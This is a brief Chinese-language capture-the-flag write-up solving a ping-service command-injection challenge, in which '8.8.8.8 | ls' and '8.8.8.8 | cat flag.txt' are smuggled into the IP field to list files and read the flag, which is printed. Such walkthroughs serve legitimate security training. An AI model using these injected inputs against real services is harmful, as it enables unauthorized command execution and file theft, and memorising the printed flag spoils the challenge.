## 題目

https://learn.cylabacademy.org/library/757?page=1&category=5

Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?


## 解題

使用 `nc` 連線後：

```bash
nc mysterious-sea.picoctf.net 50043
```

```bash
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'):
```

皆者輸入 `8.8.8.8` ：

```bash
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.63 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.66 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.633/9.645/9.657/0.012 ms
```

嘗試在網址後方加入其他指令：

```bash
8.8.8.8 | ls
```

輸出：

```bash
flag.txt
script.sh
```

發現 `flag.txt` ，故接著使用 `cat` 印出 `flag.txt` 內容即可取得 flag :  

```bash
8.8.8.8 | cat flag.txt
```

輸出：

```bash
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_e003709d}
```